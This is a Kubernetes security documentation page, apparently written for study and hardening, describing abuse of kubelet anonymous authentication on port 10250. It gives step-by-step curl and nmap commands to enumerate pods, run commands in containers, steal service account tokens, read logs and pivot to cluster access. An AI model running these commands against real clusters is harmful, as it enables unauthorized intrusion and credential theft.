---
sidebar_position: 22
title: "Kubelet Anonymous Authentication Abuse"
description: "How attackers exploit kubelet anonymous authentication to execute commands, read pod logs, and access sensitive data on Kubernetes nodes."
keywords: [kubernetes security, kubelet anonymous authentication, kubelet API, kubelet exploit, node compromise, kubernetes node security, CIS benchmark, kubelet unauthenticated, CKS]
tags: [attack-vector, kubelet, node-security, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-authentication/
  - /kubernetes-security/attack-vectors/exposed-kubelet-api/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/cis/cis-benchmark-for-k8s/
---

# Kubelet Anonymous Authentication Abuse

The **kubelet** is the primary node agent running on each Kubernetes node, responsible for managing pods and containers. By default in some configurations, the kubelet API allows **anonymous authentication**, meaning any network request to port 10250 can access the kubelet without credentials.

When anonymous authentication is enabled, attackers who gain network access to a node can **list pods, execute commands inside containers, retrieve logs, and access sensitive data** without any authentication.

---

## Exploitation Steps

An attacker with network access to the kubelet port (typically 10250) exploits the anonymous authentication misconfiguration.

### 1. Discover Kubelet Endpoints

The attacker scans for accessible kubelet APIs on the network:

```bash
nmap -p 10250 -sV 10.0.0.0/24
```

Alternatively, from inside a compromised pod:

```bash
curl -sk https://${NODE_IP}:10250/pods
```

If the response returns pod information without requiring authentication, anonymous access is enabled.

---

### 2. List Running Pods on the Node

The attacker queries the kubelet to enumerate all pods running on the node:

```bash
curl -sk https://10.0.0.5:10250/pods | jq '.items[].metadata | {name, namespace}'
```

This reveals pod names, namespaces, and container information.

---

### 3. Execute Commands Inside Containers

Using the kubelet's `/run` endpoint, the attacker executes arbitrary commands inside any container on the node:

```bash
curl -sk https://10.0.0.5:10250/run/kube-system/kube-proxy-abc123/kube-proxy \
  -X POST \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

This retrieves the service account token from the targeted container.

---

### 4. Retrieve Container Logs

The attacker reads container logs to extract sensitive information:

```bash
curl -sk https://10.0.0.5:10250/containerLogs/production/api-server-pod/api-container
```

Logs may contain credentials, API keys, database connection strings, or other secrets.

---

### 5. Pivot to Cluster-Wide Access

Using stolen service account tokens, the attacker authenticates to the Kubernetes API server:

```bash
export TOKEN=$(curl -sk https://10.0.0.5:10250/run/kube-system/coredns-abc123/coredns \
  -X POST -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")

kubectl --token=$TOKEN --server=https://kubernetes.default.svc auth can-i --list
```

If the compromised service account has elevated privileges, the attacker gains cluster-wide access.

---

### Result

The attacker achieves:

- **Pod enumeration** across all namespaces on the node
- **Arbitrary command execution** inside any container
- **Service account token theft** for privilege escalation
- **Log access** potentially containing sensitive data
- **Lateral movement** to other nodes and the control plane

---

## Mitigation

➡ [Securing Kubelet Authentication](/kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-authentication/)

---

## References

This article is based on information from the following official sources:

1. [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/) - Kubernetes Documentation
2. [CIS Kubernetes Benchmark - Kubelet](https://www.cisecurity.org/benchmark/kubernetes) - Center for Internet Security
3. [Securing a Cluster](https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/) - Kubernetes Documentation
